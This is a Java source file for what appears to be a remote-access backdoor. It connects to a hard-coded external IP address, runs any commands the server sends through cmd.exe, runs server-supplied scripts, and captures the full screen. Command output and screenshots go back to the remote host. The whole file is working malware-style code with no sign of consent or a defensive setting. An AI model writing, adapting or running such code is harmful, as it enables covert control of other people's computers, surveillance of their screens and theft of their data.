import ParserPackage.Parser;
import org.json.simple.JSONObject;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.util.Base64;

public class Main {
    public static void main(String[] args) throws IOException {
        System.out.println(SocketHandler.getMACAddress());

        SocketHandler socketHandler = SocketHandler.connect("3.89.196.174", 8080);
        socketHandler.setOnDataListener(data -> {
            int id = data.getId();
            if (data.getType().equals("command")) {
                ProcessBuilder processBuilder = new ProcessBuilder();
                processBuilder.command("cmd.exe", "/c", "\"" + ((String) data.getMap().get("command")).replaceAll("\"", "^\"") + "\"");
                new Thread(() -> {
                    try {
                        Process process = processBuilder.start();
                        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                        StringBuilder stringBuilder = new StringBuilder();
                        String line;
                        while ((line = reader.readLine()) != null) stringBuilder.append(line).append("\n");
                        JSONObject result = new JSONObject();
                        result.put("type", "result");
                        result.put("result", stringBuilder.toString());
                        result.put("id", id);
                        socketHandler.write(result.toString());
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }).start();
            } else if (data.getType().equals("psl")) {
                String psl = (String) data.getMap().get("command");
                try {
                    FileWriter fileWriter = new FileWriter("program.psl");
                    fileWriter.write(psl);
                    fileWriter.close();
                    PrintStream systemOut = System.out;
                    ByteArrayOutputStream out = new ByteArrayOutputStream();
                    System.setOut(new PrintStream(out));
                    Parser.interpret("program.psl");
                    System.setOut(systemOut);
                    JSONObject result = new JSONObject();
                    result.put("type", "result");
                    result.put("result", out.toString());
                    result.put("id", id);
                    socketHandler.write(result.toString());
                } catch (Exception e) {
                    e.printStackTrace();
                }
            } else if (data.getType().equals("screenshot")) {
                try {
                    BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
                    ImageIO.write(image, "PNG", outputStream);
                    String base64 = Base64.getEncoder().encodeToString(outputStream.toByteArray());
                    JSONObject result = new JSONObject();
                    result.put("type", "result");
                    result.put("base64", base64);
                    result.put("id", id);
                    socketHandler.write(result.toString());
                } catch (AWTException | IOException e) {
                    e.printStackTrace();
                }
            }
        });
    }
}
